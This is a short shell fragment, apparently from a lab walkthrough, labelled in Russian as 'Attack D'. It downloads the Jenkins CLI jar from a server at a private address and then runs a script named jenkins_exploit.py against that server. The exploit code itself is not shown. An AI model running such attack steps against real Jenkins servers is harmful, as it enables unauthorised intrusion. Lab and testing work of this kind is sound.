wget -q -nc http://172.20.0.105:8080/jnlpJars/jenkins-cli.jar
file jenkins-cli.jar
# Атака D: автоматизация через Python
python3 ./jenkins_exploit.py http://172.20.0.105:8080/